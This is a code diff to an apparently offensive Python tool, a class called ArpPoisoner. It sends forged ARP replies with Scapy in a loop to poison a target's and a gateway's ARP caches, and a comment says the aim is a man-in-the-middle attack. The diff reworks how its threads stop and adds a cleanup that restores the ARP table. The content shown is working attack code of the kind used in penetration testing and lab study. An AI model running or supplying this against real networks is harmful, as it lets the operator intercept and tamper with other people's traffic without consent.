@@ -41,7 +41,6 @@ class ArpPoisoner:
         self.t1 = threading
         self.t2 = threading
         self.thread_lock_event = threading.Event()
-        self.thread_lock_event.set()
 
     def get_target_mac(self):
         if not self.ignore_cache:
@@ -86,18 +85,23 @@ class ArpPoisoner:
         arp = ARP(psrc=gateway_ip, pdst=target_ip, hwdst=target_mac, op=2)  # is-at operation
 
         # Indefinitely send packets based on thread lock event
-        while self.thread_lock_event.is_set():
+        while not self.thread_lock_event.is_set():
             send(arp, verbose=0)
             print(colored("[ARP] Sent packet to {} / {} from {}".format(target_ip, target_mac, gateway_ip), "light_grey"))
-            time.sleep(self.interval)
+            self.thread_lock_event.wait(self.interval)
         print("Killing thread")
 
     def close_threads(self):
-        print("attempting to close threads.")
-        self.thread_lock_event.clear()
+        print("\nProgram Interrupted")
+        print("Attempting to cleanup.")
+        self.thread_lock_event.set()
         self.t1.join()
         self.t2.join()
-        print("threads successfully closed")
+        print("Successfully Cleaned up")
+
+    def cleanup(self):
+        self.close_threads()
+        self.restore_arp_table()
 
     def start(self):
         # Poison the target's and gateway's ARP cache to establish a MITM attack
